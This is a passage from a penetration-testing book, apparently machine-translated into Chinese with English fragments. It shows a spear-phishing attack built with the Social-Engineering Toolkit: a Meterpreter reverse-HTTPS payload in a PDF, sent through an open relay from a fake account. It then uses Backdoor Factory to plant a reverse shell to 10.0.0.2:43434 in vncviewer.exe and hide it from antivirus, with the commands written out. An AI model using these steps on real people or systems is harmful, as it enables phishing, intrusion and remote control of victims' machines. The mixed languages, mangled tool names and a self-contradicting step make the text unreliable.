由于三个选项中的将运行代码，使受害者机器通过电话向您的 Metasploit Framework MeterMeter 工具返回，并且您一直在使用该工具进行练习，因此选择其中一个作为您的恶意负载可能是有意义的。让我们选择选项七，Windows MeterMeter 反向 HTTPS。

当我们输入`7`时，我们会得到几个选项：

1.  **侦听器的 IP 地址（LHOST）**：使用您将拥有侦听器的主机地址。我的卡利工作站认为它是`10.0.2.15`。
2.  **端口连接回【443】**：此处默认为端口`443`，但您可以在监听设备的任何端口设置侦听器。`443`是 HTTPS 端口，所以从它的编号来看不会有什么异常。如果防火墙管理员将批准的端口列入白名单，并将所有其他端口列入黑名单，则端口`12234`将看起来不寻常，也可能被阻止。
3.  It states that payloads are sent to `/root/.set/template.pdf` directory.

    ![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00957.jpeg)

    它不是这样做的。在这种情况下，可执行文件被设置为`legit.exe`。如下图所示输入文件名时，需要使用完整路径：

4.  Once you have chosen the name of the PDF, fire up the Social-Engineering Toolkit Mass E-Mailer.

    如果您已经找到了一个开放邮件中继、一个 Gmail 帐户或任何合法的电子邮件 SMTP 服务器，那么邮件发送者将使用开放邮件中继。集合不包含其自己的 SMTP 服务器。您可能希望找到一个可以用于此目的的免费电子邮件服务，或者使用开放式中继邮件服务器。

    ![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00958.jpeg)

5.  Choose, or write a new e-mail message:

    SE Toolkit 允许您为您的网络钓鱼电子邮件攻击选择几个不同的美味电子邮件主题，并且您可以轻松添加新模板以自定义方法。下面列表中的第四个选项是我们刚刚创建的：

    ![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00959.jpeg)

6.  For this test of the system, I chose to send the attack to and from a Gmail account over which I have control. SE Toolkit does not return to the mailer section in the event of an error in sending the message. Gmail caught the bogus PDF file and sent back a link to its security pages:

    ![Creating a Spear-Phishing Attack with the Social Engineering Toolkit](../Images/image00960.jpeg)

7.  使用来自不检查受感染附件的服务器的电子邮件帐户。我们使用`<[evilhacker@act23.com](mailto:evilhacker@act23.com)>`并将电子邮件发送至`<[kalibook@act23.com](mailto:kalibook@act23.com)>`，发送成功：

# 利用后门工厂规避杀毒

该漏洞代码在未安装杀毒软件的 XP SP2 机器上运行良好，在未安装杀毒软件的任何机器上运行良好，但在安装基本默认 Windows 杀毒软件的 Windows 10 机器上效果较差。我们不得不关闭反病毒软件的实时检查功能，以使电子邮件阅读无误，反病毒软件清除了我们篡改的文件。作为安全工程师，我们很高兴 MicrosoftWindows10 具有如此有效的反恶意软件功能，这是一项全新的功能。作为渗透测试人员，我们感到失望。

后门工厂将 shell 代码插入到工作的 EXE 文件中，而不改变原来的所有内容。您可以使用以下`/usr/share/windows-binaries`目录中的可执行文件，或任何其他未编码保护的 Windows 二进制文件：

![Using Backdoor-Factory to Evade Antivirus](../Images/image00961.jpeg)

运行后门工厂并在`43434`端口的`10.0.0.2`上创建一个具有侦听器的远程 shell 的代码如下。跳洞选项将代码散布在可执行文件的空白处，进一步混淆防病毒扫描：

```
backdoor-factory –cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp

```

如果您在 shell 代码选择中出错（如上所述），应用程序将显示您的选择：

![Using Backdoor-Factory to Evade Antivirus](../Images/image00962.jpeg)

```
backdoor-factory –cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp_inline

```

后门工厂接着进行，并且提供了将外壳代码注入二进制文件中所有空隙或洞穴的选项：

![Using Backdoor-Factory to Evade Antivirus](../Images/image00963.jpeg)

我们将选择洞穴 1：

![Using Backdoor-Factory to Evade Antivirus](../Images/image00964.jpeg)

`backdoored`目录在根主目录`~/backdoored/`中；因此，很容易找到。我们可以使用 Social Engineering Toolkit 将这个修改过的文件推送到群发邮件中，但您可以通过电子邮件将它从一个伪造的帐户发送到 Windows 10 邮箱，看看它是否能够清除反病毒障碍。该可执行文件必须压缩以通过邮件服务器上的过滤器，一旦在 Windows 10 计算机上解压缩，它就会作为恶意软件文件被清除。

Windows 10 defaultAnti-virus 从社交工程工具包中找到此文件，正如它找到另一个文件一样。未打补丁的旧版本 Windows 显然存在风险。

# 总结

在本章中，您已经看到了在 Windows 计算机上获得控制和设置后门的五种不同方法，从 Ncat 脚本到 metasploit Meterpler 攻击，再到添加 dropbox，再到使用社交工程工具包发送钓鱼电子邮件，再到使用后门工厂使用 shell 脚本后门创建可执行文件。

在下一章中，我们将讨论您收集的恶意软件的反向工程，以便您了解它在野外或网络中可能会做什么，并对您的设备进行压力测试。